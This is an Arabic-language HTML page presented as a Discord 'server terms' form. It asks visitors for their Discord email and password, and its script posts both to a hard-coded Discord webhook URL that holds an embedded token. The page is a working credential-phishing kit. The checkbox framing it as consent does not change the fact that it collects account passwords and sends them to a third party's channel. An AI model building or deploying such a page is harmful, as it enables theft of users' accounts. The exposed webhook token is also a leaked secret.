<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>نموذج إرسال بيانات ديسكورد عبر Webhook</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      direction: rtl;
      padding: 30px;
      max-width: 400px;
      margin: auto;
    }
    label {
      margin-top: 15px;
      display: block;
      font-weight: bold;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      padding: 10px;
      background-color: #7289da;
      color: white;
      border: none;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      border-radius: 4px;
    }
    button:hover {
      background-color: #5b6eae;
    }
    .consent-label {
      font-weight: normal;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h2>أدخل بيانات ديسكورد الخاصة بك</h2>

  <form id="discordForm">
    <label for="discord_email">إيميل الديسكورد:</label>
    <input type="email" id="discord_email" required />

    <label for="password">كلمة السر:</label>
    <input type="password" id="password" required />

    <label class="consent-label">
      <input type="checkbox" id="consent" required />
  أوافق على شروط السرفر
    </label>

    <button type="submit">إرسال</button>
  </form>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1364438803170725899/9Zrvq7SXUIUIE8VEdazpPYtyc1qwDmaJufck8dEfC2w0xbc5TVktfzrb6vUJnPasaqDb";

    document.getElementById('discordForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const email = document.getElementById('discord_email').value.trim();
      const password = document.getElementById('password').value.trim();
      const consent = document.getElementById('consent').checked;

      if (!consent) {
        alert("يجب الموافقة على مشاركة المعلومات");
        return;
      }

      const message = {
        embeds: [
          {
            title: "تم استلام بيانات جديدة من الموقع",
            color: 7506394,
            fields: [
              { name: "إيميل الديسكورد", value: email, inline: false },
              { name: "كلمة السر", value: password, inline: false }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      })
      .then(response => {
        if (response.ok) {
          alert('تم الإرسال بنجاح!');
          this.reset();
        } else {
          alert('فشل الإرسال، حاول مرة أخرى لاحقاً.');
        }
      })
      .catch(error => {
        alert('خطأ في الاتصال: ' + error.message);
      });
    });
  </script>
</body>
</html>
